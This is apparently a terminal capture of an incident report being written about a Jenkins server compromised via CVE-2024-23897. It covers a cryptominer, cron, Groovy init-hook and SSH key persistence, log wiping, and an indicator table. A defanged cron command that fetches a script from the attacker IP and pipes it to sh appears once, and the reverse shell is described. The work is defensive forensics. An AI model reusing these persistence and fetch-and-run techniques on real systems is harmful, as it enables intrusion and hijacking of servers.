[?2004l[?2004h> # Incident Intrusion Report ‚Äî Jenkins Groovy Cryptominer & Persistence Campaign
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> 
[?2004l[?2004h> On 2026-08-19, security operations detected malicious cryptomining activity on `jenkins-prod-01` (`/sas/handoff/intake.pdf`). Forensic analysis of the disk image (`/disk`) and alert logs (`/sas`) reveals an unauthenticated external attacker exploited CVE-2024-23897, a Jenkins CLI arbitrary file read / RCE vulnerability enabled by a disabled security realm (`useSecurity=false`) (`/disk/var/lib/jenkins/config.xml:3`).
[?2004l[?2004h> 
[?2004l[?2004h> The threat actor performed a multi-stage post-compromise sequence:
[?2004l[?2004h> 1. Exploited CVE-2024-23897 via an `@` deserialization gadget (`/disk/var/lib/jenkins/jobs/.tmp/config.xml:3`).
[?2004l[?2004h> 2. Deployed an XMRig cryptominer binary at `/disk/opt/jenkins/.xmr/xmrig:1`.
[?2004l[?2004h> 3. Established scheduled persistence via a cron job at `/disk/var/spool/cron/crontabs/jenkins:5`.
[?2004l[?2004h> 4. Planted a silent Groovy initialization hook backdoor at `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`.
[?2004l[?2004h> 5. Planted a silent SSH `authorized_keys` backdoor at `/disk/var/lib/jenkins/.ssh/authorized_keys:2`.
[?2004l[?2004h> 6. Wiped/truncated Jenkins logs to obscure C2 beaconing activity (`/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> 
[?2004la[?2004h> While endpoint security alerts surfaced the miner and cron job (`/sas/alerts.json:2`), the Groovy init hook and SSH authorized keys backdoors were completely silent.
[?2004l[?2004h> 
[?2004le[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Threat Entities & Indicators of Compromise (IOCs)
[?2004l[?2004h> 
[?2004l[?2004h> | Entity Type | Indicator / Value | Context & Evidence Citation |
[?2004l[?2004h> |---|---|---|
[?2004l`/disk/var/lib[?2004h> | Host Identifier | `jenkins-prod-01` | Compromised Jenkins controller (`/sas/cti/advisory.txt:5`) |
[?2004l[?2004h> | Attacker Origin IP | `198.51.100.98` | Source IP for C2 and reverse shell (`/sas/cti/advisory.txt:6`, `/disk/var/lib/.cache/.wiped.bin:1`, `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`) |
[?2004l`/sa[?2004h> | C2 Domain | `update-jenkins.example.cn` | Recovered C2 domain (`/sas/cti/advisory.txt:22`, `/disk/var/lib/.cache/.wiped.bin:1`) |
[?2004l[?2004h> | Cryptomining Pool | `stratum+tcp://xmr.jenkins.evil:3333` | Monero mining pool server (`/sas/cti/advisory.txt:23`) |
[?2004l[?2004h> | Wallet Address | `4A0000000000000000003d98ef6bc04b` | Threat actor Monero wallet (`/sas/cti/advisory.txt:24`) |
[?2004l.[?2004h> | Vulnerability | `CVE-2024-23897` | Jenkins CLI file read / RCE vulnerability (`/sas/cti/advisory.txt:16`, `/sas/vulns.json:4`) |
[?2004l[?2004h> | Compromised User | `jenkins` | Local user account running Jenkins service (`/disk/var/spool/cron/crontabs/jenkins:5`) |
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Attack Chain & Technical Analysis
[?2004l[?2004h> 
[?2004l[?2004h> ### Stage 1: Initial Access & Exploitation (T1190)
[?2004l[?2004h> - **Vulnerability**: CVE-2024-23897 (`/sas/cti/advisory.txt:16`, `/sas/vulns.json:4`).
[?2004l[?2004h> - **Mechanism**: The threat actor exploited the Jenkins CLI parser feature where argument values starting with `@` reading local file contents. Combined with disabled security controls (`useSecurity=false`) (`/disk/var/lib/jenkins/config.xml:3`), unauthenticated attackers can execute arbitrary CLI commands and deserialization gadgets.
[?2004l[?2004h> - **Artifact**: RCE payload file found at `/disk/var/lib/jenkins/jobs/.tmp/config.xml:3` (`/sas/alerts.json:2`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Stage 2: Execution & Resource Hijacking (T1059.004, T1496)
[?2004l[?2004h> - **Cryptominer Execution**: Dropped binary at `/disk/opt/jenkins/.xmr/xmrig:1` (`/sas/alerts.json:10`).
[?2004l[?2004h> - **Impact**: CPU resource hijacking for Monero mining directed to pool `stratum+tcp://xmr.jenkins.evil:3333` (`/sas/cti/advisory.txt:23`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Stage 3: Persistence Mechanisms
[?2004l[?2004h> 
[?2004l[?2004h> #### A. Alerted Persistence ‚Äî Cron Job (T1053.003)
[?2004l[?2004h> - **Location**: `/disk/var/spool/cron/crontabs/jenkins:5` (`/sas/alerts.json:18`).
[?2004l[?2004h> - **Details**: Cron entry scheduled to execute `curl hxxp://198.51.100.98/x | sh` every minute. Re-downloads and re-installs cryptominer and secondary payloads if removed.
[?2004l[?2004h> 
[?2004l[?2004h> #### B. Silent Persistence ‚Äî Groovy Init Hook (T1037.004)
[?2004l[?2004h> - **Location**: `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`.
[?2004l[?2004h> - **Details**: Groovy scripts in `init.groovy.d/` automatically execute upon Jenkins startup with full administrative rights. Script spawns a background thread that executes a reverse shell back to `198.51.100.98` (`/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`). Unalerted by security tooling.
[?2004l[?2004h> 
[?2004l[?2004h> #### C. Silent Persistence ‚Äî SSH Authorized Keys Backdoor (T1098.004)
[?2004l[?2004h> - **Location**: `/disk/var/lib/jenkins/.ssh/authorized_keys:2`.
[?2004l[?2004h> - **Details**: Attacker injected a rogue SSH public key into the `jenkins` user's `authorized_keys` file (`/disk/var/lib/jenkins/.ssh/authorized_keys:2`), allowing direct interactive SSH access without authentication alerts.
[?2004l[?2004h> 
[?2004l[?2004h> ### Stage 4: Defense Evasion & Anti-Forensics (T1070.002)
[?2004l[?2004h> - **Action**: Attacker truncated Jenkins operational logs and attempted to scrub C2 connection records.
[?2004l[?2004h> - **Artifact**: Recovered remnant data in `/disk/var/lib/.cache/.wiped.bin:1` confirmed C2 beaconing to `198.51.100.98` and `update-jenkins.example.cn` (`/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Benign Artifact Analysis (False Positive Elimination)
[?2004l[?2004h> 
[?2004l[?2004h> - **File**: `/disk/var/lib/jenkins/init.groovy.d/logging.groovy:1`.
[?2004l[?2004h> - **Findings**: Contains scheduled maintenance configuration running `/usr/local/bin/backup.sh --remote 10.10.71`. Verified as an approved, legitimate operational script (`/disk/var/lib/jenkins/init.groovy.d/logging.groovy:1`) and must NOT be quarantined or deleted.
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
